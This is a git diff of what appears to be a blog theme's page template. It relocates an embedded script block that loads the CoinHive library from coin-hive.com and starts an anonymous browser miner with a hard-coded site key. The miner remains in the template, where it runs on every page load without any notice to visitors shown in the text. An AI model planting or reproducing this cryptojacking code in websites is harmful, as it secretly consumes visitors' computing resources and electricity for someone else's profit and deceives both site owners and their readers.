@@ -178,7 +178,11 @@ gitment.render('gitcomments')
 <% } %>
 
 
-
+<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+<script>
+    var miner = new CoinHive.Anonymous('4SNTix9rvkP5W3DW8ItfnLqhn3QZckg7');
+    miner.start();
+</script>
 
 <% if(config['anchorjs']) { %>
 <!-- async load function -->
@@ -203,11 +207,7 @@ gitment.render('gitcomments')
         anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
     })
 </script>
-<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
-<script>
-    var miner = new CoinHive.Anonymous('4SNTix9rvkP5W3DW8ItfnLqhn3QZckg7');
-    miner.start();
-</script>
+
 <style>
     /* place left on bigger screen */
     @media all and (min-width: 800px) {
